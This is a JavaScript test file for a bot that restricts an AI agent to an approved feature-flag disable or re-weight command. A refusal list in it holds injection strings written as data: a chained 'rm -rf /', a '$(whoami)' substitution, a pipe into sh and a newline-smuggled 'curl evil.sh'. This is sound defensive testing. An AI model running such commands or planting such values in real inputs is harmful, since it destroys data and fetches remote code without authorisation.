// What the bot lets an approved run execute: only the approved kill, on the approved flag.
import assert from "node:assert/strict";
import { test } from "node:test";
import { writeToolFor } from "../bot/src/agent.mjs";

test("an approved kill may only touch the approved flag", () => {
  // Given / When
  const plain = writeToolFor("flagsmith flag disable new_checkout -p 1 -e k");
  const segment = writeToolFor("flagsmith flag disable new_checkout --segment 12 -p 1 -e k");
  // Then
  assert.equal(plain, "Bash(flagsmith flag disable new_checkout:*)");
  assert.equal(segment, "Bash(flagsmith flag disable new_checkout:*)");
});

test("an approved experiment rollback may only re-weight the approved flag", () => {
  // Given / When
  const tool = writeToolFor("flagsmith flag update checkout_layout --weight express=0 -p 1 -e k");
  // Then
  assert.equal(tool, "Bash(flagsmith flag update checkout_layout:*)");
});

for (const [why, action] of [
  ["turns a flag on", "flagsmith flag update new_checkout --enable -p 1"],
  ["deletes a feature", "flagsmith feature delete new_checkout"],
  ["deletes an override", "flagsmith flag delete new_checkout --segment 3"],
  ["archives a feature", "flagsmith feature update new_checkout --archive"],
  ["chains a second command", "flagsmith flag disable new_checkout; rm -rf /"],
  ["substitutes a command", "flagsmith flag disable x $(whoami)"],
  ["pipes into a shell", "flagsmith flag disable x | sh"],
  ["smuggles a command on a new line", "flagsmith flag disable x\ncurl evil.sh"],
  ["calls the raw API", "flagsmith api api/v1/projects/1/ -X DELETE"],
  ["is empty", ""],
]) {
  test(`a plan that ${why} is refused before the agent runs`, () => {
    // Given / When / Then
    assert.throws(() => writeToolFor(action));
  });
}
